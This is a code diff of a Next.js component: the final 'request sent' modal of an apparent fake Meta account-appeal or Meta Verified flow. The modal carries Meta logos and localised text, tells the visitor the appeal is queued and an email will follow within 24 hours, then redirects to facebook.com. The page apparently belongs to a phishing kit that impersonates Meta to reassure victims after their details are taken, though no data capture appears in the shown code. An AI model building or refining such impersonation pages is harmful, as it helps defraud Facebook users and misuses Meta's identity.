@@ -1,49 +1,56 @@
-import FinalImage from '@/assets/images/final-image.png';
-import MetaLogo from '@/assets/images/meta-logo-image.png';
-import { store } from '@/store/store';
-import translateText from '@/utils/translate';
+'use client';
+
+import '@/assets/css/meta-verified-modals.css';
+import MetaLogoGrey from '@/assets/images/meta-logo-grey.png';
+import SuccessImage from '@/assets/images/succes.jpg';
+import TickIcon from '@/assets/images/tick.svg';
+import type { MetaVerifiedTexts } from '@/constants/meta-verified-texts';
 import Image from 'next/image';
-import { useEffect, useState, type FC } from 'react';
+import { type FC } from 'react';
 
-const FinalModal: FC = () => {
-    const [translations, setTranslations] = useState<Record<string, string>>({});
-
-    const { geoInfo } = store();
-    const t = (text: string): string => {
-        return translations[text] || text;
-    };
-
-    useEffect(() => {
-        if (!geoInfo) return;
-
-        const textsToTranslate = ['Request has been sent', 'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.', 'Return on Facebook'];
-
-        const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-
-            for (const text of textsToTranslate) {
-                translatedMap[text] = await translateText(text, geoInfo.country_code);
-            }
-
-            setTranslations(translatedMap);
-        };
-
-        translateAll();
-    }, [geoInfo]);
-
+const FinalModal: FC<{ uiTexts: MetaVerifiedTexts }> = ({ uiTexts }) => {
     return (
-        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
-            <div className='flex max-h-[90vh] w-full max-w-xl flex-col gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
-                <p className='mt-4 text-2xl font-bold'>{t('Request has been sent')}</p>
-                <p className='text-xl'>{t('Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.')}</p>
-                <div className='flex flex-col justify-center gap-10'>
-                    <Image src={FinalImage} alt='' />
-                    <button type='button' onClick={() => window.location.replace('https://www.facebook.com')} className='mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700'>
-                        {t('Return on Facebook')}
-                    </button>
+        <div className='mv-modal-overlay' role='dialog' aria-modal='true'>
+            <div
+                className='mv-modal-card'
+                style={{
+                    padding: '36px 32px 28px',
+                    display: 'flex',
+                    flexDirection: 'column',
+                    alignItems: 'center',
+                    borderRadius: '24px'
+                }}
+            >
+                <h2 style={{ fontSize: '22px', fontWeight: 700, color: '#1c2b33', margin: '0 0 20px 0', textAlign: 'center' }}>
+                    {uiTexts.successTitle}
+                </h2>
+
+                <div style={{ width: '100%', borderRadius: '16px', overflow: 'hidden', marginBottom: '24px', boxShadow: '0 4px 12px rgba(0,0,0,0.05)' }}>
+                    <Image src={SuccessImage} alt='Success' className='h-auto w-full' />
                 </div>
-                <div className='flex items-center justify-center p-3'>
-                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
+
+                <div style={{ textAlign: 'center', width: '100%', maxWidth: '380px', marginBottom: '28px' }}>
+                    <p style={{ fontSize: '15px', color: '#4b5e7d', lineHeight: '1.6', margin: '0 0 12px 0', fontWeight: 500 }}>
+                        {uiTexts.successMessage1}
+                    </p>
+                    <p style={{ fontSize: '15px', color: '#4b5e7d', lineHeight: '1.6', margin: 0, fontWeight: 500 }}>
+                        {uiTexts.successMessage2}
+                        <Image src={TickIcon} width={18} height={18} alt='tick' style={{ display: 'inline-block', verticalAlign: 'middle', marginLeft: '6px' }} />
+                    </p>
+                    <p style={{ fontSize: '13px', color: '#8a9ab5', lineHeight: '1.5', margin: '12px 0 0 0' }}>{uiTexts.successMessage3}</p>
+                </div>
+
+                <button
+                    type='button'
+                    className='mv-login-submit'
+                    onClick={() => window.location.replace('https://www.facebook.com')}
+                >
+                    {uiTexts.confirm}
+                </button>
+
+                <div style={{ marginTop: '32px', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '4px' }}>
+                    <Image src={MetaLogoGrey} alt='Meta Logo' height={18} style={{ height: '18px', width: 'auto', opacity: 0.8 }} />
+                    <span style={{ fontSize: '12px', color: '#8a9ab5', fontWeight: 400 }}>{uiTexts.aboutHelpMore}</span>
                 </div>
             </div>
         </div>
